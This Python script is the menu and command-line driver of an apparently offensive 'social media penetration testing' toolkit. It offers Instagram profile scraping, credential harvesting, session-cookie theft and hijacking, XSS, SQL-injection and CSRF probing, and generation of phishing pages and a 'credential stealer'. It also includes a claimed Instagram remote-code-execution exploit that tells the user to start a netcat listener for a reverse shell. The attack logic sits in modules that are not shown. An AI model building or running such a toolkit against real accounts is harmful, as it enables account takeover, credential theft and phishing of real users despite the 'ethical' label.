#!/usr/bin/env python3
"""
Social Media Penetration Testing Tool
A comprehensive tool for ethical hacking and penetration testing on social media platforms.
"""

import os
import sys
import logging
import argparse
from colorama import init, Fore, Style

# Initialize colorama
init()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Import modules from the modules package
import modules

from modules.recon import Reconnaissance
from modules.cred_harvest import CredentialHarvester
from modules.session_hijack import SessionHijacker
from modules.exploit import SocialMediaExploiter


class SocialHacker:
    """
    Main class for the Social Media Penetration Testing Tool
    """
    
    def __init__(self):
        self.recon = Reconnaissance()
        self.harvester = CredentialHarvester()
        self.hijacker = SessionHijacker()
        self.exploiter = SocialMediaExploiter()
        self.target = None
        
    def display_banner(self):
        """Display the tool banner"""
        banner = """
    ████████╗███████╗███████╗██████╗  ██████╗███████╗
    ╚══██╔══╝██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝
       ██║   █████╗  █████╗  ██████╔╝██║     █████╗  
       ██║   ██╔══╝  ██╔══╝  ██╔══██╗██║     ██╔══╝  
       ██║   ███████╗███████╗██║  ██║╚██████╗███████╗
       ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝
                                                   
    Social Media Penetration Testing Tool
    Ethical Hacking Framework for Social Media Platforms
    """
        print(Fore.RED + banner + Style.RESET_ALL)
        print(Fore.YELLOW + "="*80 + Style.RESET_ALL)
        print(Fore.CYAN + "Version: 1.0.0 | Author: Ethical Hacker" + Style.RESET_ALL)
        print(Fore.YELLOW + "="*80 + Style.RESET_ALL)
        print()
        
    def display_menu(self):
        """Display the main menu"""
        menu = """
    MAIN MENU - Select an Option:
    
    [1] Reconnaissance & Information Gathering
    [2] Credential Harvesting
    [3] Session Hijacking
    [4] Exploitation
    [5] Payload Generation
    [6] Configuration
    [0] Exit
    """
        print(menu)
        
    def recon_menu(self):
        """Reconnaissance submenu"""
        print(Fore.CYAN + "\n=== Reconnaissance Menu ===" + Style.RESET_ALL)
        print("1. Gather comprehensive target information")
        print("2. Scrape Instagram profile")
        print("3. Scrape Instagram posts")
        print("0. Back to main menu")
        
        choice = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
        
        if choice == '1':
            target = input("Enter target username or email: ")
            results = self.recon.gather_target_info(target)
            self.display_results(results)
        elif choice == '2':
            username = input("Enter Instagram username: ")
            profile = self.recon.social_media.scrape_instagram_profile(username)
            self.display_results({'instagram_profile': profile})
        elif choice == '3':
            username = input("Enter Instagram username: ")
            max_posts = int(input("Enter max posts to scrape: "))
            posts = self.recon.social_media.scrape_instagram_posts(username, max_posts)
            self.display_results({'instagram_posts': posts})
            
    def harvesting_menu(self):
        """Credential harvesting submenu"""
        print(Fore.CYAN + "\n=== Credential Harvesting Menu ===" + Style.RESET_ALL)
        print("1. Harvest credentials from URL")
        print("2. Test credentials on login form")
        print("3. List harvested credentials")
        print("4. Save harvested credentials")
        print("0. Back to main menu")
        
        choice = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
        
        if choice == '1':
            url = input("Enter target URL: ")
            credentials = self.harvester.harvest_from_url(url)
            print(f"Harvested {len(credentials)} credentials")
        elif choice == '2':
            url = input("Enter target URL: ")
            username = input("Enter username: ")
            password = input("Enter password: ")
            credentials = {'username': username, 'password': password}
            harvested = self.harvester.harvest_from_url(url, credentials)
            if harvested:
                print(Fore.GREEN + "Login successful!" + Style.RESET_ALL)
            else:
                print(Fore.RED + "Login failed!" + Style.RESET_ALL)
        elif choice == '3':
            credentials = self.harvester.get_harvested_credentials()
            self.display_results({'harvested_credentials': credentials})
        elif choice == '4':
            filename = input("Enter filename to save: ")
            self.harvester.save_credentials(filename)
            
    def session_menu(self):
        """Session hijacking submenu"""
        print(Fore.CYAN + "\n=== Session Hijacking Menu ===" + Style.RESET_ALL)
        print("1. Steal session cookies from URL")
        print("2. Hijack session using cookies")
        print("3. Scan for session vulnerabilities")
        print("4. List stolen sessions")
        print("5. Save stolen sessions")
        print("0. Back to main menu")
        
        choice = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
        
        if choice == '1':
            url = input("Enter target URL: ")
            cookies = self.hijacker.steal_session_cookies(url)
            print(f"Found {len(cookies)} session cookies")
        elif choice == '2':
            url = input("Enter target URL: ")
            cookie_str = input("Enter cookies (name1=value1; name2=value2): ")
            cookies = dict(c.strip().split('=', 1) for c in cookie_str.split(';') if '=' in c)
            success = self.hijacker.hijack_session(url, cookies)
            print(f"Session hijacking {'successful' if success else 'failed'}")
        elif choice == '3':
            url = input("Enter target URL: ")
            vulnerabilities = self.hijacker.scan_for_session_vulnerabilities(url)
            self.display_results({'session_vulnerabilities': vulnerabilities})
        elif choice == '4':
            sessions = self.hijacker.get_stolen_sessions()
            self.display_results({'stolen_sessions': sessions})
        elif choice == '5':
            filename = input("Enter filename to save: ")
            self.hijacker.save_sessions(filename)
            
    def exploit_menu(self):
        """Exploitation submenu"""
        print(Fore.CYAN + "\n=== Exploitation Menu ===" + Style.RESET_ALL)
        print("1. Scan for XSS vulnerabilities")
        print("2. Exploit XSS vulnerability")
        print("3. Test SQL injection")
        print("4. CSRF vulnerability check")
        print("5. Instagram RCE exploit (bio overflow)")
        print("0. Back to main menu")
        
        choice = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
        
        if choice == '1':
            url = input("Enter target URL: ")
            vulnerabilities = self.exploiter.scan_xss_vulnerabilities(url)
            self.display_results({'xss_vulnerabilities': vulnerabilities})
        elif choice == '2':
            url = input("Enter vulnerable URL: ")
            payload = input("Enter XSS payload: ")
            result = self.exploiter.exploit_xss(url, payload)
            print(result)
        elif choice == '3':
            url = input("Enter target URL: ")
            result = self.exploiter.test_sql_injection(url)
            print(result)
        elif choice == '4':
            url = input("Enter target URL: ")
            forms = self.exploiter.check_csrf_vulnerabilities(url)
            self.display_results({'csrf_vulnerabilities': forms})
        elif choice == '5':
            print(Fore.YELLOW + "\n=== Instagram RCE Exploit ===" + Style.RESET_ALL)
            csrf_token = input("Enter Instagram CSRF token: ")
            session_id = input("Enter Instagram session ID: ")
            lhost = input("Enter local host IP (default: 192.168.1.100): ") or "192.168.1.100"
            lport = int(input("Enter local port (default: 4444): ") or 4444)
            
            # Create session cookies
            session_cookies = {
                'sessionid': session_id,
                'csrftoken': csrf_token
            }
            
            print(Fore.CYAN + "\n⚠️  Important: Open a new terminal and run 'nc -lvnp 4444' to listen for the reverse shell" + Style.RESET_ALL)
            input(Fore.GREEN + "\nPress Enter to continue..." + Style.RESET_ALL)
            
            try:
                success = self.exploiter.exploit_instagram_rce(csrf_token, session_cookies, lhost, lport)
                if success:
                    print(Fore.GREEN + "\n✅ Exploit successful! Check your Netcat listener for the reverse shell." + Style.RESET_ALL)
                else:
                    print(Fore.RED + "\n❌ Exploit failed. Please check your credentials and network settings." + Style.RESET_ALL)
            except Exception as e:
                print(Fore.RED + f"\n❌ Error: {e}" + Style.RESET_ALL)
            
    def payload_menu(self):
        """Payload generation submenu"""
        print(Fore.CYAN + "\n=== Payload Generation Menu ===" + Style.RESET_ALL)
        print("1. Generate XSS payload")
        print("2. Generate phishing template")
        print("3. Generate credential stealer")
        print("0. Back to main menu")
        
        choice = input(Fore.GREEN + "\nEnter your choice: " + Style.RESET_ALL)
        
        if choice == '1':
            payload = self.exploiter.generate_xss_payload()
            print(f"\nGenerated XSS payload:\n{payload}")
        elif choice == '2':
            target = input("Enter target platform (facebook/twitter/instagram): ")
            filename = input("Enter output filename: ")
            self.exploiter.generate_phishing_template(target, filename)
            print(f"Phishing template saved to {filename}")
        elif choice == '3':
            filename = input("Enter output filename: ")
            self.exploiter.generate_credential_stealer(filename)
            print(f"Credential stealer saved to {filename}")
            
    def display_results(self, results):
        """Display results in a readable format"""
        print(Fore.YELLOW + "\n=== RESULTS ===" + Style.RESET_ALL)
        for key, value in results.items():
            print(f"\n{Fore.CYAN}{key}:{Style.RESET_ALL}")
            if isinstance(value, dict):
                for k, v in value.items():
                    print(f"  {k}: {v}")
            elif isinstance(value, list):
                for item in value:
                    if isinstance(item, dict):
                        for k, v in item.items():
                            print(f"  {k}: {v}")
                    else:
                        print(f"  {item}")
            else:
                print(f"  {value}")
        print()
        
    def run(self):
        """Run the main menu loop"""
        self.display_banner()
        
        while True:
            self.display_menu()
            
            choice = input(Fore.GREEN + "Enter your choice: " + Style.RESET_ALL)
            
            if choice == '1':
                self.recon_menu()
            elif choice == '2':
                self.harvesting_menu()
            elif choice == '3':
                self.session_menu()
            elif choice == '4':
                self.exploit_menu()
            elif choice == '5':
                self.payload_menu()
            elif choice == '6':
                print(Fore.YELLOW + "\nConfiguration not implemented yet" + Style.RESET_ALL)
            elif choice == '0':
                print(Fore.GREEN + "\nExiting Social Hacker. Stay ethical!" + Style.RESET_ALL)
                break
            else:
                print(Fore.RED + "\nInvalid choice! Please try again." + Style.RESET_ALL)
                
            input(Fore.YELLOW + "\nPress Enter to continue..." + Style.RESET_ALL)


def main():
    """Main function"""
    parser = argparse.ArgumentParser(
        description='Social Media Penetration Testing Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  python social_hacker.py                      # Run interactive mode
  python social_hacker.py recon -t username    # Reconnaissance mode
  python social_hacker.py harvest -t url       # Harvest credentials
  python social_hacker.py hijack -t url        # Hijack session
  python social_hacker.py exploit -t url       # Exploit vulnerabilities
        '''
    )
    
    # Create subparsers for different commands
    subparsers = parser.add_subparsers(title='Commands', dest='command', help='Available commands')
    
    # Recon command
    parser_recon = subparsers.add_parser('recon', help='Reconnaissance - gather target information')
    parser_recon.add_argument('-t', '--target', required=True, help='Target username or email')
    parser_recon.add_argument('-p', '--platform', help='Target platform (facebook/twitter/instagram/linkedin)')
    parser_recon.add_argument('-o', '--output', help='Output file for results')
    parser_recon.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # Harvest command
    parser_harvest = subparsers.add_parser('harvest', help='Credential Harvesting - capture credentials')
    parser_harvest.add_argument('-t', '--target', required=True, help='Target URL or username')
    parser_harvest.add_argument('-p', '--platform', help='Target platform (facebook/twitter/instagram/linkedin)')
    parser_harvest.add_argument('-u', '--username', help='Username to test')
    parser_harvest.add_argument('-P', '--password', help='Password to test')
    parser_harvest.add_argument('-o', '--output', help='Output file for results')
    parser_harvest.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # Hijack command
    parser_hijack = subparsers.add_parser('hijack', help='Session Hijacking - steal and hijack sessions')
    parser_hijack.add_argument('-t', '--target', required=True, help='Target URL')
    parser_hijack.add_argument('-p', '--platform', help='Target platform (facebook/twitter/instagram/linkedin)')
    parser_hijack.add_argument('-c', '--cookies', help='Session cookies to use (name1=value1; name2=value2)')
    parser_hijack.add_argument('-o', '--output', help='Output file for results')
    parser_hijack.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # Exploit command
    parser_exploit = subparsers.add_parser('exploit', help='Exploitation - scan and exploit vulnerabilities')
    parser_exploit.add_argument('-t', '--target', required=True, help='Target URL')
    parser_exploit.add_argument('-p', '--platform', help='Target platform (facebook/twitter/instagram/linkedin)')
    parser_exploit.add_argument('-x', '--xss', action='store_true', help='Scan for XSS vulnerabilities')
    parser_exploit.add_argument('-s', '--sql', action='store_true', help='Test for SQL injection')
    parser_exploit.add_argument('-c', '--csrf', action='store_true', help='Check for CSRF vulnerabilities')
    parser_exploit.add_argument('--generate-phish', help='Generate phishing template for target platform')
    parser_exploit.add_argument('-o', '--output', help='Output file for results')
    parser_exploit.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # Legacy arguments (for backward compatibility)
    parser.add_argument('-r', '--recon-legacy', help='Target username for reconnaissance (legacy syntax)')
    parser.add_argument('-t', '--target-legacy', help='Target URL (legacy syntax)')
    parser.add_argument('-u', '--username-legacy', help='Username for testing (legacy syntax)')
    parser.add_argument('-P', '--password-legacy', help='Password for testing (legacy syntax)')
    parser.add_argument('-o', '--output-legacy', help='Output file for results (legacy syntax)')
    parser.add_argument('-v', '--verbose-legacy', action='store_true', help='Verbose output (legacy syntax)')
    
    args = parser.parse_args()
    
    # Set verbose logging
    if args.verbose or args.verbose_legacy:
        logger.setLevel(logging.DEBUG)
        
    # Create instance
    tool = SocialHacker()
    
    # Handle subcommands
    if args.command == 'recon':
        print(Fore.CYAN + f"Starting reconnaissance on target: {args.target}" + Style.RESET_ALL)
        if args.platform:
            print(Fore.YELLOW + f"Target platform: {args.platform}" + Style.RESET_ALL)
        results = tool.recon.gather_target_info(args.target)
        tool.display_results(results)
        
        if args.output:
            import json
            with open(args.output, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(Fore.GREEN + f"Results saved to {args.output}" + Style.RESET_ALL)
            
    elif args.command == 'harvest':
        print(Fore.CYAN + f"Starting credential harvesting on: {args.target}" + Style.RESET_ALL)
        if args.platform:
            print(Fore.YELLOW + f"Target platform: {args.platform}" + Style.RESET_ALL)
            
        if args.username and args.password:
            credentials = {'username': args.username, 'password': args.password}
            harvested = tool.harvester.harvest_from_url(args.target, credentials)
            
            if harvested:
                print(Fore.GREEN + "Login successful!" + Style.RESET_ALL)
                if args.output:
                    tool.harvester.save_credentials(args.output)
            else:
                print(Fore.RED + "Login failed!" + Style.RESET_ALL)
        else:
            print(Fore.YELLOW + "Scanning for login forms..." + Style.RESET_ALL)
            forms = tool.harvester.form_grabber.grab_forms(args.target)
            login_forms = tool.harvester.form_grabber.analyze_forms()
            print(f"Found {len(forms)} total forms, {len(login_forms)} potential login forms")
            
    elif args.command == 'hijack':
        print(Fore.CYAN + f"Starting session hijacking on: {args.target}" + Style.RESET_ALL)
        if args.platform:
            print(Fore.YELLOW + f"Target platform: {args.platform}" + Style.RESET_ALL)
            
        if args.cookies:
            # Parse cookies string
            cookies = dict(c.strip().split('=', 1) for c in args.cookies.split(';') if '=' in c)
            success = tool.hijacker.hijack_session(args.target, cookies)
            print(f"Session hijacking {'successful' if success else 'failed'}")
        else:
            print(Fore.YELLOW + "Scanning for session cookies..." + Style.RESET_ALL)
            cookies = tool.hijacker.steal_session_cookies(args.target)
            if cookies:
                print(f"Found {len(cookies)} session cookies:")
                for cookie_name, cookie_value in cookies.items():
                    print(f"  {cookie_name}: {cookie_value}")
                
                print("\nChecking session vulnerabilities...")
                vulnerabilities = tool.hijacker.scan_for_session_vulnerabilities(args.target)
                if vulnerabilities:
                    print(f"Found {len(vulnerabilities)} vulnerabilities:")
                    for vuln in vulnerabilities:
                        print(f"  - {vuln['type']} ({vuln['cookie']}): {vuln['description']}")
                
                if args.output:
                    tool.hijacker.save_sessions(args.output)
                    print(f"\nSessions saved to {args.output}")
            else:
                print("No session cookies found")
                
    elif args.command == 'exploit':
        print(Fore.CYAN + f"Starting exploitation on: {args.target}" + Style.RESET_ALL)
        if args.platform:
            print(Fore.YELLOW + f"Target platform: {args.platform}" + Style.RESET_ALL)
            
        # Handle phishing template generation
        if args.generate_phish:
            if args.platform:
                print(Fore.YELLOW + "Generating phishing template..." + Style.RESET_ALL)
                tool.exploiter.generate_phishing_template(args.platform, args.generate_phish)
                print(Fore.GREEN + f"Phishing template saved to {args.generate_phish}" + Style.RESET_ALL)
            else:
                print(Fore.RED + "Error: --platform is required for phishing template generation" + Style.RESET_ALL)
        else:
            # Regular exploitation
            vulnerabilities = []
            
            if args.xss or not (args.xss or args.sql or args.csrf):
                print(Fore.YELLOW + "Scanning for XSS vulnerabilities..." + Style.RESET_ALL)
                xss_vulns = tool.exploiter.scan_xss_vulnerabilities(args.target)
                vulnerabilities.extend(xss_vulns)
                
            if args.sql or not (args.xss or args.sql or args.csrf):
                print(Fore.YELLOW + "Testing for SQL injection..." + Style.RESET_ALL)
                sql_result = tool.exploiter.test_sql_injection(args.target)
                print(sql_result)
                
            if args.csrf or not (args.xss or args.sql or args.csrf):
                print(Fore.YELLOW + "Checking for CSRF vulnerabilities..." + Style.RESET_ALL)
                csrf_vulns = tool.exploiter.check_csrf_vulnerabilities(args.target)
                vulnerabilities.extend(csrf_vulns)
                
            if vulnerabilities and args.output:
                import json
                with open(args.output, 'w', encoding='utf-8') as f:
                    json.dump(vulnerabilities, f, indent=2, ensure_ascii=False)
                print(Fore.GREEN + f"Vulnerabilities saved to {args.output}" + Style.RESET_ALL)
            
    elif args.recon_legacy:
        # Legacy syntax support
        print(Fore.CYAN + f"Starting reconnaissance on target: {args.recon_legacy}" + Style.RESET_ALL)
        results = tool.recon.gather_target_info(args.recon_legacy)
        tool.display_results(results)
        
        if args.output_legacy:
            import json
            with open(args.output_legacy, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(Fore.GREEN + f"Results saved to {args.output_legacy}" + Style.RESET_ALL)
            
    elif args.target_legacy and args.username_legacy and args.password_legacy:
        # Legacy syntax support
        print(Fore.CYAN + f"Testing credentials on: {args.target_legacy}" + Style.RESET_ALL)
        credentials = {'username': args.username_legacy, 'password': args.password_legacy}
        harvested = tool.harvester.harvest_from_url(args.target_legacy, credentials)
        
        if harvested:
            print(Fore.GREEN + "Login successful!" + Style.RESET_ALL)
            if args.output_legacy:
                tool.harvester.save_credentials(args.output_legacy)
        else:
            print(Fore.RED + "Login failed!" + Style.RESET_ALL)
            
    elif args.target_legacy:
        # Legacy syntax support
        print(Fore.CYAN + f"Analyzing target: {args.target_legacy}" + Style.RESET_ALL)
        
        # Check for forms
        forms = tool.harvester.form_grabber.grab_forms(args.target_legacy)
        login_forms = tool.harvester.form_grabber.analyze_forms()
        
        print(f"Forms found: {len(forms)}")
        print(f"Login forms identified: {len(login_forms)}")
        
        # Check session cookies
        cookies = tool.hijacker.steal_session_cookies(args.target_legacy)
        print(f"Session cookies found: {len(cookies)}")
        
        # Check session vulnerabilities
        vulnerabilities = tool.hijacker.scan_for_session_vulnerabilities(args.target_legacy)
        print(f"Session vulnerabilities found: {len(vulnerabilities)}")
        
        if args.output_legacy:
            import json
            results = {
                'forms': forms,
                'login_forms': login_forms,
                'session_cookies': cookies,
                'session_vulnerabilities': vulnerabilities
            }
            with open(args.output_legacy, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            print(Fore.GREEN + f"Results saved to {args.output_legacy}" + Style.RESET_ALL)
            
    else:
        # Run in interactive mode
        tool.run()
        
        
if __name__ == "__main__":
    main()
